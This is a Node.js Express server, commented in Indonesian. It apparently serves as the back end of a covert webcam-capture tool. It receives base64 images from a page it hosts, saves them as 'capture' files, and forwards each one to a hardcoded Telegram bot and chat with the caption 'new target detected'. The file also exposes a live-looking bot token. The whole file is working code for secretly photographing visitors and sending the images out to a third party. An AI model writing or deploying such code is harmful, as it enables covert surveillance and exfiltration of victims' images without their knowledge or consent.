const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.post('/simpan', async (req, res) => {
    const base64Data = req.body.image;
    if (!base64Data) return res.json({ status: false });

    try {
        const base64Image = base64Data.split(';base64,').pop();
        const buffer = Buffer.from(base64Image, 'base64');
        const namaFile = `capture_${Date.now()}.jpg`;
        const filePath = path.join(uploadDir, namaFile);

        // 1. Simpan Lokal (Berhasil)
        fs.writeFileSync(filePath, buffer);
        console.log(`✅ File simpan di: ${namaFile}`);

        // 2. Kirim ke Telegram (Pakai Axios + FormData)
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'tangkapan.jpg' });
        form.append('caption', '📸 *TARGET BARU TERDETEKSI!*');
        form.append('parse_mode', 'Markdown');

        console.log("📤 Sedang mencoba tembak ke Telegram...");
        
        const teleRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });

        if (teleRes.data.ok) {
            console.log("🚀 MANTAP! Bot berhasil kirim foto.");
            res.json({ status: true });
        } else {
            console.log("❌ Telegram nolak:", teleRes.data.description);
            res.json({ status: false });
        }

    } catch (err) {
        console.error("🔥 Error:", err.response ? err.response.data : err.message);
        res.json({ status: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server ON di port ' + PORT));